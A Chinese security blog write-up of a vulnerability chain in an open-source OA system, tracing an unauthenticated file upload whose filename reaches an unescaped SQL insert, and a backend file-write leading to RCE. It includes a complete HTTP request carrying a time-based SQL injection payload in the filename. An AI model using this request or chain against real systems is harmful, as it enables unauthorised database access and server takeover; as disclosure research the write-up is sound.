#  真的就是RCE   
菜狗  富贵安全   2025-04-22 00:00  
  
## 一、漏洞详情  
  
  
某开源OA存在前台SQL注入和后台RCE漏洞，可以用SQL注入跑出来后台账号密码，登录后打后台RCE，组合拳达到前台RCE的效果。  
  
## 二、代码分析  
  
  
首先查看index.php入口文件。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/veA9QmcJk5kbYOspuibCFIQhZQBy6eDR5M5pNQkMzE1zfmqiaZcAibAV7WlQibhNDFT3ic0cDYhBnk6TWKDq3TfY48A/640?wx_fmt=png&from=appmsg "")  
  
  
获取get传入的m、d、a参数，最后包含了/include/View.php文件，跟进此文件  
  
```
<?phpif(!isset($ajaxbool))$ajaxbool = $rock->jm->gettoken('ajaxbool', 'false');$ajaxbool   = $rock->get('ajaxbool', $ajaxbool);$p        = PROJECT;if(!isset($m))$m='index';if(!isset($a))$a='default';if(!isset($d))$d='';$m        = $rock->get('m', $m);$a        = $rock->get('a', $a);$d        = $rock->get('d', $d);define('M', $m);define('A', $a);define('D', $d);define('P', $p);$_m       = $m;if($rock->contain($m, '|')){    $_mas  = explode('|', $m);    $m        = $_mas[0];    $_m       = $_mas[1];}include_once($rock->strformat('?0/?1/?1Action.php',ROOT_PATH, $p));$rand      = date('YmdHis').rand(1000,9999);if(substr($d,-1)!='/' && $d!='')$d.='/';$errormsg   = '';$methodbool = true;$actpath    = $rock->strformat('?0/?1/?2?3',ROOT_PATH, $p, $d, $_m);define('ACTPATH', $actpath);$actfile    = $rock->strformat('?0/?1Action.php',$actpath, $m);$actfile1   = $rock->strformat('?0/?1Action.php',$actpath, $_m);$actbstr    = null;if(file_exists($actfile1))include_once($actfile1);if(file_exists($actfile)){    include_once($actfile);    $clsname   = ''.$m.'ClassAction';    $xhrock       = new $clsname();    $actname   = ''.$a.'Action';    if($ajaxbool == 'true')$actname    = ''.$a.'Ajax';    if(method_exists($xhrock, $actname)){       $xhrock->beforeAction();       $actbstr = $xhrock->$actname();       $xhrock->bodyMessage = $actbstr;       if(is_string($actbstr)){echo $actbstr;$xhrock->display=false;}       if(is_array($actbstr)){echo json_encode($actbstr);$xhrock->display=false;}    }else{       $methodbool = false;       if($ajaxbool == 'false')echo ''.$actname.' not found;';    }    $xhrock->afterAction();}else{    echo 'actionfile not exists;';    $xhrock       = new Action();}
```  
  
传入的m参数来定位某个php文件，d参数表示webmain文件夹的某个目录，a参数表示执行的函数方法，当传入的ajaxbool为true时，a参数调用的Ajax方法，ajaxbool默认为false，a参数调用的Action方法。  
  
## 三、漏洞分析  
  
### 1、前台SQL注入  
  
  
漏洞文件在webmain/task/api/uploawAction.php文件下。  
  
```
<?php class uploawClassAction extends apiAction{    public function initAction()    {       $this->display= false;    }    /**    *  上传文件    */    public function upfileAction()    {       if(!$_FILES)exit('sorry!');       $upimg = c('upfile');       $maxsize= (int)$this->get('maxsize', $upimg->getmaxzhao());//上传最大M       $uptypes= 'jpg|png|docx|doc|pdf|xlsx|xls|zip|rar';       $upimg->initupfile($uptypes, ''.UPDIR.'|'.date('Y-m').'', $maxsize);       $upses = $upimg->up('file');       if(!is_array($upses))exit($upses);       $arr   = c('down')->uploadback($upses);       $arr['autoup'] = (getconfig('qcloudCos_autoup') || getconfig('alioss_autoup')) ? 1 : 0; //是否上传其他平台       return $arr;    }}
```  
  
此类继承了apiAction类，查看apiAction类，发现其中有initAction，是个鉴权方法  
  
```
public function initAction(){    $this->display= false;    $time     = time();    $this->cfrom= $this->request('cfrom');    $this->token= $this->request('token', $this->admintoken);    $this->adminid      = (int)$this->request('adminid', $this->adminid);    $this->adminname = '';    $boss = (M == 'login|api');    if(!$boss){       if(isempt($this->token))$this->showreturn('','token invalid', 199);       $lodb = m('login');       $onto = $lodb->getone("`uid`='$this->adminid' and `token`='$this->token' and `online`=1");       if(!$onto)$this->showreturn('','登录失效，请重新登录', 199);       $lodb->update("`moddt`='{$this->rock->now}'", $onto['id']);    }    $this->userrs = m('admin')->getone("`id`='$this->adminid' and `status`=1", '`name`,`user`,`id`,`ranking`,`deptname`,`deptid`');    if(!$this->userrs && !$boss){       $this->showreturn('', '用户已经不存在了，请重新登录', 199);    }    $this->adminname      = arrvalue($this->userrs, 'name');    $this->rock->adminid   = $this->adminid;    $this->rock->adminname     = $this->adminname;    $this->admintoken     = $this->token;}
```  
  
但是在uploawAction.php中重写了init方法，所以uploawAction.php中的upfileAction方法是个前台方法。  
  
```
public function initAction(){    $this->display= false;}
```  
  
查看upfileAction方法  
  
```
public function upfileAction(){    if(!$_FILES)exit('sorry!');    $upimg = c('upfile');    $maxsize= (int)$this->get('maxsize', $upimg->getmaxzhao());//上传最大M    $uptypes= 'jpg|png|docx|doc|pdf|xlsx|xls|zip|rar';    $upimg->initupfile($uptypes, ''.UPDIR.'|'.date('Y-m').'', $maxsize);    $upses = $upimg->up('file');    if(!is_array($upses))exit($upses);    $arr   = c('down')->uploadback($upses);    $arr['autoup'] = (getconfig('qcloudCos_autoup') || getconfig('alioss_autoup')) ? 1 : 0; //是否上传其他平台    return $arr;}
```  
  
首先，判断是不是上传文件行为，否则退出。之后把upfile带入到c方法，跟进c方法  
  
```
function c($name, $inbo=true, $param1='', $param2=''){    $class = ''.$name.'Chajian';    $path  = ''.ROOT_PATH.'/include/chajian/'.$class.'.php';    $cls   = NULL;    if(file_exists($path)){       include_once($path);       if($inbo)$cls  = new $class($param1, $param2);    }    return $cls;   }
```  
  
也就是包含了/include/chajian/upfilechajian.php  
  
  
之后调用upfilechajian.php中的up方法，并且把结果赋值给upses参数，跟进up方法  
  
```
public function up($name,$cfile=''){    if(!$_FILES)return 'sorry!';    $file_name    = $_FILES[$name]['name'];    $file_size    = $_FILES[$name]['size'];//字节    $file_type    = $_FILES[$name]['type'];    $file_error       = $_FILES[$name]['error'];    $file_tmp_name = $_FILES[$name]['tmp_name'];    $zongmax      = $this->getmaxupsize();       if($file_size<=0 || $file_size > $zongmax){       return '文件为0字节/超过'.$this->formatsize($zongmax).'，不能上传';    }    $file_sizecn   = $this->formatsize($file_size);    $file_ext     = $this->getext($file_name);//文件扩展名    $file_img     = $this->isimg($file_ext);    $file_kup     = $this->issavefile($file_ext);    if(!$file_img && !$this->isoffice($file_ext) && getconfig('systype')=='demo')return '演示站点禁止文件上传';    if($file_error>0){       $rrs = $this->geterrmsg($file_error);       return $rrs;    }    if(!$this->contain('|'.$this->ext.'|', '|'.$file_ext.'|') && $this->ext != '*'){       return '禁止上传文件类型['.$file_ext.']';    }    if($file_size>$this->maxsize*1024*1024){       return '上传文件过大，限制在：'.$this->formatsize($this->maxsize*1024*1024).'内，当前文件大小是：'.$file_sizecn.'';    }    //创建目录    $zpath=explode('|',$this->path);    $mkdir='';    for($i=0;$i<count($zpath);$i++){       $mkdir.=''.$zpath[$i].'/';       if(!is_dir($mkdir))mkdir($mkdir);    }    //新的文件名    $file_newname  = $file_name;    $randname     = $file_name;    if(!$cfile==''){       $file_newname=''.$cfile.'.'.$file_ext.'';    }else{       $_oldval    = m('option')->getval('randfilename');       $randname   = $this->getrandfile(1, $_oldval);       m('option')->setval('randfilename', $randname);       $file_newname=''.$randname.'.'.$file_ext.'';    }    $save_path = ''.str_replace('|','/',$this->path);    //if(!is_writable($save_path))return '目录'.$save_path.'无法写入不能上传';    $allfilename= $save_path.'/'.$file_newname.'';    $uptempname    = $save_path.'/'.$randname.'.uptemp';    $upbool       = true;    if(!$file_kup){       $allfilename= $this->filesave($file_tmp_name, $file_newname, $save_path, $file_ext);       if(isempt($allfilename))return '无法保存到'.$save_path.'';    }else{       $upbool       = @move_uploaded_file($file_tmp_name,$allfilename);    }    if($upbool){       $picw=0;$pich=0;       if($file_img){          $fobj = $this->isimgsave($file_ext, $allfilename);          if(!$fobj){             return 'error:非法图片文件';          }else{             $picw = $fobj[0];             $pich = $fobj[1];            }       }       return array(          'newfilename' => $file_newname,          'oldfilename' => $file_name,          'filesize'    => $file_size,          'filesizecn'  => $file_sizecn,          'filetype'    => $file_type,          'filepath'    => $save_path,          'fileext'     => $file_ext,          'allfilename' => $allfilename,          'picw'        => $picw,          'pich'        => $pich       );    }else{       return '上传失败：'.$this->geterrmsg($file_error).'';    }}
```  
  
其实也就是获取上传文件的各个属性，最后输出一个数组，赋值给upses参数。  
  
  
然后走到$arr   = c('down')->uploadback($upses);，调用downchajian.php中的uploadback方法，传入upses参数，跟进uploadback方法。  
  
```
public function uploadback($upses, $thumbnail='', $subo=true){    if($thumbnail=='')$thumbnail='150x150';    $msg      = '';    $data     = array();    if(is_array($upses)){       $noasyn = $this->rock->get('noasyn'); //=yes就不同步到文件平台       $noyaso = $this->rock->get('noyaso'); //=yes就不压缩       $fileext= substr($upses['fileext'],0,10);       $arrs  = array(          'adddt'    => $this->rock->now,          'valid'    => 1,          'filename' => $this->replacefile($upses['oldfilename']),          'web'     => $this->rock->web,          'ip'      => $this->rock->ip,          'mknum'       => $this->rock->get('sysmodenum'),          //'mid'       => $this->rock->get('sysmid','0'),          'fileext'  => $fileext,          'filesize' => (int)$this->rock->get('filesize', $upses['filesize']),          'filesizecn'=> $upses['filesizecn'],          'filepath' => str_replace('../','',$upses['allfilename']),          'optid'       => $this->adminid,          'optname'  => $this->adminname,          'comid'       => m('admin')->getcompanyid(),       );
```  
  
此方法中，把upses参数中的oldfilename的值赋予给arrs数组中的filename值。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/veA9QmcJk5kbYOspuibCFIQhZQBy6eDR59d41jRic82ptxaxDlo7tvl1cRCUOuLwprBJ9iadGzbMWqKdDKYAm7UeA/640?wx_fmt=png&from=appmsg "")  
  
  
最后把整个数组带入到record方法中，跟进  
  
```
public function record($table,$array,$where=''){    $addbool   = true;    if(!$this->isempt($where))$addbool=false;    $cont     = '';    if(is_array($array)){       foreach($array as $key=>$val){          $cont.=",`$key`=".$this->toaddval($val)."";       }       $cont  = substr($cont,1);    }else{       $cont  = $array;    }    $table = $this->gettables($table);    if($addbool){       $sql="insert into $table set $cont";    }else{       $where = $this->getwhere($where);       $sql="update $table set $cont where $where";    }    return $this->tranbegin($sql);}
```  
  
直接执行SQL语句，整个过程中我们可以直接控制的参数就是upses数组中的oldfilename参数，所以这个点存在SQL注入漏洞。  
  
```
return array(    'newfilename' => $file_newname,    'oldfilename' => $file_name,    'filesize'    => $file_size,    'filesizecn'  => $file_sizecn,    'filetype'    => $file_type,    'filepath'    => $save_path,    'fileext'     => $file_ext,    'allfilename' => $allfilename,    'picw'        => $picw,    'pich'        => $pich);		$file_name		= $_FILES[$name]['name'];
```  
  
  
  
整个SQL注入的过程我们可以顺一下  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/veA9QmcJk5kbYOspuibCFIQhZQBy6eDR5gHASb59iciaWI0MPPU78qNA2KHGfG8PUyhbdKv78KBz8ZzkVAmg7m9dQ/640?wx_fmt=png&from=appmsg "")  
  
  
漏洞复现  
  
```
POST /xhoa/index.php?a=upfile&m=uploaw|api&d=task& HTTP/1.1Host: 127.0.0.1X-Requested-With: XMLHttpRequestContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryitXo7nCpRwksqD9iAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6Accept-Encoding: gzip, deflateUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0Accept: application/json, text/javascript, */*Content-Length: 141------WebKitFormBoundaryitXo7nCpRwksqD9iContent-Disposition: form-data; name="file"; filename="a',web=(select if(123=123,sleep(5),0))-- .png"123------WebKitFormBoundaryitXo7nCpRwksqD9i--
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/veA9QmcJk5kbYOspuibCFIQhZQBy6eDR5fibYqVo6nCtJJuTHvye5RxxnVUoAjtLEeTTYn7MMQiaURiaPSyBDUvFzQ/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/veA9QmcJk5kbYOspuibCFIQhZQBy6eDR5DupAMdgQV9YgDF0NDAFS4VP91setc1CBobOVEpN5lygkIaazX7icejw/640?wx_fmt=png&from=appmsg "")  
  
  
(虚拟机有固定1.7s左右延迟)  
  
### 2、后台RCE  
  
  
漏洞文件在webmain/task/api/uploadAction.php中的getmfilvAction方法中  
  
```
public function getmfilvAction(){    $fileid = (int)$this->get('fileid','0');    $frs   = m('file')->getone($fileid);    if(!$frs)return returnerror('不存在');    $lujing    = $frs['filepathout'];    if(isempt($lujing)){       $lujing = $frs['filepath'];       if(substr($lujing,0,4)!='http' && !file_exists($lujing))return returnerror('文件不存在了');    }    $fileext = $frs['fileext'];    $fname = $this->jm->base64decode($this->get('fname'));    $fname = (isempt($fname)) ? $frs['filename'] : ''.$fname.'.'.$fileext.'';    $filepath = ''.UPDIR.'/'.date('Y-m').'/'.date('d').'_rocktpl'.rand(1000,9999).'_'.$fileid.'.'.$fileext.'';    $this->rock->createtxt($filepath, file_get_contents($lujing));    $uarr = array(       'filename' => $fname,       'fileext' => $fileext,       'filepath' => $filepath,       'filesize' => filesize($filepath),       'filesizecn' => $this->rock->formatsize(filesize($filepath)),       'optid'    => $this->adminid,       'optname'  => $this->adminname,       'adddt'    => $this->rock->now,       'ip'      => $this->rock->ip,       'web'     => $this->rock->web,    );    $uarr['id'] = m('file')->insert($uarr);    return returnsuccess($uarr);}
```  
  
这个代码主要是写入一些键值到数据库中，其中有个createtxt方法，跟进  
  
  
其实就是把第二个参数的内容，写进第一个路径中  
  
```
public function createtxt($path, $txt){    $this->createdir($path);    $path  = ''.ROOT_PATH.'/'.$path.'';    @$file = fopen($path,'w');    $bo    = false;    if($file){       $bo = true;       if($txt)$bo = fwrite($file,$txt);       fclose($file);    }    return $bo;}
```  
  
那么我们思路就明确了。  
  
  
利用这个函数达到RCE的结果，分成两步，第一步，利用$uarr['id'] = m('file')->insert($uarr);方法，把我们恶意的内容写入到数据库中；第二步。利用$this->rock->createtxt($filepath, file_get_contents($lujing));来创建文件。  
  
  
  
  
漏洞复现  
  
  
本地开启python服务  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/veA9QmcJk5kbYOspuibCFIQhZQBy6eDR5uh4xibkELUDhe4PCNDkygceFuU3zx6FiaUqpo3sH3M4iaibrapAQXt3U1g/640?wx_fmt=png&from=appmsg "")  
  
  
打入payload  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/veA9QmcJk5kbYOspuibCFIQhZQBy6eDR5ECU1eYgBz1oF13mbHiaOoGuyTh5BQWI7c3FG7fBjDFHjDnbLRgAg2bw/640?wx_fmt=png&from=appmsg "")  
  
  
之后去遍历fileid  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/veA9QmcJk5kbYOspuibCFIQhZQBy6eDR5vkCcIK6PTuUL7ibWdxY2jmwbQn0XbhOAjxm8ezYyoAr1YMicwibI5icUGQ/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/veA9QmcJk5kbYOspuibCFIQhZQBy6eDR5ppVxn287f9mibBfOngRFIxXDCiaVFEkwY8O5JF6qlIl7K15tKibzMPLPw/640?wx_fmt=png&from=appmsg "")  
  
原文链接:  
https://xz.aliyun.com/news/17273  
  
